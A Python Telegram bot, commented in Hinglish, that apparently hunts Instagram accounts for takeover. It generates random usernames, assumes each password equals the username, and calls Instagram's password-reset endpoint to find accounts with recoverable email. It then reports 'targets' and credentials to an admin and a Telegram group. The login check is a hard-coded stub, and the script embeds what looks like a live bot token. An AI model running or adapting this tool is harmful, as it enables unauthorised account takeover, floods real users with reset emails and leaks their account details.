import os, requests, random, string, json, threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from colorama import Fore, init

init(autoreset=True)

# --- 1. CONFIGURATION (Render Environment Variables se connect hai) ---
# Agar aap Render use kar rahe hain, toh ye values wahan se uthayega
TOKEN = os.getenv("BOT_TOKEN", "8568247844:AAHGQOJElf3_Zg5QGDkjGLgEaZHiukRL_mA")
GROUP_ID = int(os.getenv("GROUP_ID", "-5171086005"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7831276550"))

class BotState:
    is_running = False
    target_year = None
    target_followers = 0
    meta_only = False

state = BotState()

# --- 2. MESSAGING FUNCTIONS ---
def send_to_dm(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': ADMIN_ID, 'text': text})

def send_to_group(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': GROUP_ID, 'text': text})

# --- 3. EMAIL RESET CHECKER LOGIC ---
def check_email_reset(username):
    """Instagram se pucho ki kya is ID ka email reset available hai"""
    url = "https://www.instagram.com/api/v1/accounts/send_password_reset_email/"
    headers = {
        "User-Agent": "Instagram 113.0.0.39.122 Android",
        "X-CSRFToken": "missing"
    }
    data = {"username": username}
    try:
        res = requests.post(url, headers=headers, data=data, timeout=10).json()
        if "obfuscated_email" in str(res):
            return True, res.get("obfuscated_email")
        return False, None
    except:
        return False, None

# --- 4. HARVESTING LOOP ---
def harvest_loop():
    print(f"{Fore.GREEN}[*] Bot Started. Searching for Email Enabled IDs...")
    while state.is_running:
        try:
            # Random User Generate
            user = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
            pasw = user 
            
            # --- LOGIN CHECK (Example logic) ---
            # Yahan aap apna login API call daal sakte hain
            login_success = True 
            
            if login_success:
                # AB SABSE ZAROORI: Reset Email Check karo
                has_email, email_hint = check_email_reset(user)
                
                if has_email:
                    # TARGET MIL GAYA: Email reset enabled hai
                    msg = (f"🔥 TARGET FOUND (Email Reset Enabled)!\n\n"
                           f"👤 User: {user}\n"
                           f"🔐 Pass: {pasw}\n"
                           f"📧 Reset Email: {email_hint}\n\n"
                           f"Script Stopped.")
                    send_to_dm(msg)
                    state.is_running = False # Script stop kar do
                else:
                    # Login toh hai par email reset nahi mil raha -> Group mein bhej do
                    send_to_group(f"✅ WORKING (No Reset Email)\n👤 User: {user}\n🔐 Pass: {pasw}")

        except Exception:
            continue

# --- 5. SECURE TELEGRAM COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    state.is_running = True
    threading.Thread(target=harvest_loop, daemon=True).start()
    await update.message.reply_text("🚀 Harvesting Shuru! Sirf Email Reset wali IDs DM aayengi.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    state.is_running = False
    await update.message.reply_text("🛑 Script Paused.")

# --- 6. RUN ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    print(f"{Fore.CYAN}Bot Online. Control via DM.")
    app.run_polling()
    
